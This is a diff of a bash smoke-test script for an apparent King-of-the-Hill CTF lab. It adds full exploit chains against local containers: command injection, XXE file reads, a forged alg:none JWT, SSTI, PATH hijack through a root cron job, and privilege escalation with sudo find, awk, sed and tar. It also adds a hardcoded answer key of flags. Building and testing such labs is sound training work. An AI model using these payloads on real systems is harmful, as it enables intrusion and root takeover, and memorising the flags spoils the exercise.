@@ -1,9 +1,11 @@
 #!/usr/bin/env bash
-# Smoke test of ALL 4 hills: full chain attack->user->root->king + reset (revives the vuln).
+# Smoke test of ALL 9 hills: full chain attack->user->root->king + reset (revives the vuln).
 # Requires the containers running (docker compose up in each deploy/hills/*).
 # Returns non-zero on any FAIL.
 set -uo pipefail
 TOKEN="TOK-RED-7f3a9c"
+# hill-7: forged alg:none admin JWT (header.payload. with empty signature)
+JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoic2F1cm9uIiwicm9sZSI6ImFkbWluIn0."
 PASS=0; FAIL=0
 ok(){ if [ "$1" = "$2" ]; then echo "  PASS $3"; PASS=$((PASS+1)); else echo "  FAIL $3 (got: [$1] exp: [$2])"; FAIL=$((FAIL+1)); fi; }
 has(){ if echo "$1" | grep -q "$2"; then echo "  PASS $3"; PASS=$((PASS+1)); else echo "  FAIL $3 (got: [$1])"; FAIL=$((FAIL+1)); fi; }
@@ -32,14 +34,55 @@ h4_root(){ curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlenco
 h4_king(){ curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c \\\"echo $TOKEN > /root/king.txt\\\"'\",shell=True,capture_output=True,text=True).stdout" >/dev/null;
            curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/king.txt'\",shell=True,capture_output=True,text=True).stdout" | grep -o 'TOK-[A-Za-z0-9-]*'; }
 
+# hill-5 (repair-gated boot -> command injection -> sudo find). Repair first, then /mine.
+h5_repair(){ curl -s -X POST http://127.0.0.1:8085/rescue --data-urlencode $'cfg=set root=(hd0,gpt1)\nset passphrase="mellon"\nset boot=on' >/dev/null; }
+h5_user(){ h5_repair; curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; cat /home/moria/user.txt' | grep -o 'CTF{[^}]*}'; }
+h5_root(){ h5_repair; curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; sudo find /etc/hostname -exec cat /root/root.txt \;' | grep -o 'CTF{[^}]*}'; }
+h5_king(){ h5_repair; curl -s -G http://127.0.0.1:8085/mine --data-urlencode "q=x; sudo find /etc/hostname -exec sh -c \"echo $TOKEN > /root/king.txt\" \;" >/dev/null;
+           curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; sudo find /etc/hostname -exec cat /root/king.txt \;' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-6 (XXE leaks user flag + attunement key -> command console -> sudo awk).
+h6_scry(){ curl -s -X POST http://127.0.0.1:8086/scry --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://$1\">]><vision>&x;</vision>"; }
+h6_user(){ h6_scry /home/palantir/user.txt | grep -o 'CTF{[^}]*}'; }
+h6_key(){ h6_scry /opt/app/palantir.key | tr -d '\r\n'; }
+h6_root(){ K=$(h6_key); curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$K" --data-urlencode "cmd=sudo awk 'BEGIN{system(\"cat /root/root.txt\")}' /dev/null" | grep -o 'CTF{[^}]*}'; }
+h6_king(){ K=$(h6_key); curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$K" --data-urlencode "cmd=sudo awk 'BEGIN{system(\"echo $TOKEN > /root/king.txt\")}' /dev/null" >/dev/null;
+           curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$K" --data-urlencode "cmd=sudo awk 'BEGIN{system(\"cat /root/king.txt\")}' /dev/null" | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-7 (JWT alg:none -> admin RCE -> PATH-hijack via root cron 'keeper'; ~4s cron loop).
+h7_user(){ curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode 'cmd=cat /home/watch/user.txt' | grep -o 'CTF{[^}]*}'; }
+h7_root(){ curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode 'cmd=printf "#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/watchbin/keeper; chmod 755 /opt/watchbin/keeper' >/dev/null;
+           sleep 6; curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode 'cmd=cat /tmp/r' | grep -o 'CTF{[^}]*}'; }
+h7_king(){ curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode "cmd=printf '#!/bin/sh\necho $TOKEN > /root/king.txt\ncat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n' > /opt/watchbin/keeper; chmod 755 /opt/watchbin/keeper" >/dev/null;
+           sleep 6; curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$JWT" --data-urlencode 'cmd=cat /tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-8 (weak-cred CI console -> build RCE -> cap_setuid on forgepy).
+h8_cookie(){ curl -s -i -X POST -d 'user=saruman&password=isengard' http://127.0.0.1:8088/forge/login | grep -i set-cookie | sed 's/.*forge=//; s/;.*//' | tr -d '\r'; }
+h8_user(){ C=$(h8_cookie); curl -s -X POST -b "forge=$C" -d 'script=cat /home/orc/user.txt' http://127.0.0.1:8088/forge/run | grep -o 'CTF{[^}]*}'; }
+h8_root(){ C=$(h8_cookie); curl -s -X POST -b "forge=$C" --data-urlencode "script=forgepy -c \"import os;os.setuid(0);os.system('cat /root/root.txt')\"" http://127.0.0.1:8088/forge/run | grep -o 'CTF{[^}]*}'; }
+h8_king(){ C=$(h8_cookie); curl -s -X POST -b "forge=$C" --data-urlencode "script=forgepy -c \"import os;os.setuid(0);os.system('echo $TOKEN > /root/king.txt')\"" http://127.0.0.1:8088/forge/run >/dev/null;
+           curl -s -X POST -b "forge=$C" --data-urlencode "script=forgepy -c \"import os;os.setuid(0);os.system('cat /root/king.txt')\"" http://127.0.0.1:8088/forge/run | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-9 (SSTI -> RCE -> sudo sed).
+h9_user(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['cat','/home/program/user.txt'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
+h9_root(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['sudo','sed','-n','p','/root/root.txt'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
+h9_king(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['sudo','sed','-n','1e echo $TOKEN > /root/king.txt','/etc/hostname'],capture_output=True,text=True).stdout}}" >/dev/null;
+           curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name={{__import__('subprocess').run(['sudo','sed','-n','p','/root/king.txt'],capture_output=True,text=True).stdout}}" | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
 uf(){ case "$1" in
   1) echo 'CTF{w3b_rc3_1gn1t10n_f00th0ld}';; 2) echo 'CTF{drup4lg3dd0n2_unauth_rce}';;
-  3) echo 'CTF{r3d1s_un4uth_module_load}';;   4) echo 'CTF{j3nk1ns_gr00vy_scr1pt_c0ns0l3}';; esac; }
+  3) echo 'CTF{r3d1s_un4uth_module_load}';;   4) echo 'CTF{j3nk1ns_gr00vy_scr1pt_c0ns0l3}';;
+  5) echo 'CTF{sp34k_fr13nd_4nd_3nt3r_m0r14}';; 6) echo 'CTF{p4l4nt1r_xx3_s33s_4ll}';;
+  7) echo 'CTF{jwt_4lg_n0n3_f0rg3d_th3_3y3}';;  8) echo 'CTF{w34k_f0r3m4n_cr3ds_1s3ng4rd}';;
+  9) echo 'CTF{ss_t1_0n_th3_gr1d_10_t0w3r}';;   esac; }
 rf(){ case "$1" in
   1) echo 'CTF{l4r4v3l_sud0_gtf0b1ns_r00t}';; 2) echo 'CTF{su1d_b1t_pr1v3sc_on_h0st}';;
-  3) echo 'CTF{wr1t4bl3_cr0n_j0b_2_r00t}';;   4) echo 'CTF{h0st_pr1v3sc_sud0_r00t_w1n}';; esac; }
+  3) echo 'CTF{wr1t4bl3_cr0n_j0b_2_r00t}';;   4) echo 'CTF{h0st_pr1v3sc_sud0_r00t_w1n}';;
+  5) echo 'CTF{sud0_f1nd_1n_th3_d33p_pl4c3s}';; 6) echo 'CTF{sud0_4wk_gtf0b1ns_0rth4nc}';;
+  7) echo 'CTF{p4th_h1j4ck_1n_r00t_cr0n_w1n}';; 8) echo 'CTF{c4p_s3tu1d_0n_pyth0n_2_r00t}';;
+  9) echo 'CTF{sud0_s3d_gtf0b1ns_d3_r3z}';;   esac; }
 
-for n in 1 2 3 4; do
+for n in ${HILLS:-1 2 3 4 5 6 7 8 9}; do   # set HILLS to test a subset, e.g. HILLS="5 6 7 8 9"
   echo "=== hill-$n ==="
   ok "$(h${n}_user)" "$(uf $n)" "hill-$n user flag (foothold)"
   ok "$(h${n}_root)" "$(rf $n)" "hill-$n root flag (privesc)"
@@ -47,19 +90,23 @@ for n in 1 2 3 4; do
 done
 
 echo "=== reset revives the vuln (defense breaks privesc -> reset restores it) ==="
-# hill-1: remove sudoers
-docker exec koth-hill-1 rm -f /etc/sudoers.d/www 2>/dev/null
-r=$(h1_root); [ -z "$r" ] && { echo "  PASS hill-1 privesc blocked after removing sudoers"; PASS=$((PASS+1)); } || { echo "  FAIL hill-1 (still works: $r)"; FAIL=$((FAIL+1)); }
-docker exec koth-hill-1 /opt/app/reset.sh >/dev/null 2>&1
-ok "$(h1_root)" "$(rf 1)" "hill-1 privesc works after reset"
-# hill-2: strip SUID
-docker exec koth-hill-2 chmod 0755 /usr/local/bin/rootbash 2>/dev/null
-docker exec koth-hill-2 /opt/app/reset.sh >/dev/null 2>&1
-ok "$(h2_root)" "$(rf 2)" "hill-2 SUID privesc works after reset"
-# hill-4: remove sudoers
-docker exec koth-hill-4 rm -f /etc/sudoers.d/jenkins 2>/dev/null
-docker exec koth-hill-4 /opt/app/reset.sh >/dev/null 2>&1
-ok "$(h4_root)" "$(rf 4)" "hill-4 sudo/tar privesc works after reset"
+# break the privesc primitive for hill $1 (returns 1 for hills with no cheap check -> skipped)
+break_privesc(){ case "$1" in
+  1) docker exec koth-hill-1 rm -f /etc/sudoers.d/www 2>/dev/null;;
+  2) docker exec koth-hill-2 chmod 0755 /usr/local/bin/rootbash 2>/dev/null;;
+  4) docker exec koth-hill-4 rm -f /etc/sudoers.d/jenkins 2>/dev/null;;
+  5) docker exec koth-hill-5 rm -f /etc/sudoers.d/moria 2>/dev/null;;           # reset also re-breaks boot -> h5_root re-repairs
+  6) docker exec koth-hill-6 rm -f /etc/sudoers.d/palantir 2>/dev/null;;
+  7) docker exec koth-hill-7 sh -c 'rm -f /opt/watchbin/keeper; chown root:root /opt/watchbin; chmod 755 /opt/watchbin' 2>/dev/null;;
+  8) docker exec koth-hill-8 setcap -r /usr/local/bin/forgepy 2>/dev/null;;
+  9) docker exec koth-hill-9 rm -f /etc/sudoers.d/program 2>/dev/null;;
+  *) return 1;;                                                                  # hill-3 (writable cron): no cheap block/reset check
+esac; }
+for n in ${HILLS:-1 2 3 4 5 6 7 8 9}; do
+  break_privesc "$n" || continue
+  docker exec koth-hill-$n /opt/app/reset.sh >/dev/null 2>&1
+  ok "$(h${n}_root)" "$(rf $n)" "hill-$n privesc works after reset"
+done
 
 echo "=== SMOKE: $PASS PASS / $FAIL FAIL ==="
 [ "$FAIL" -eq 0 ]
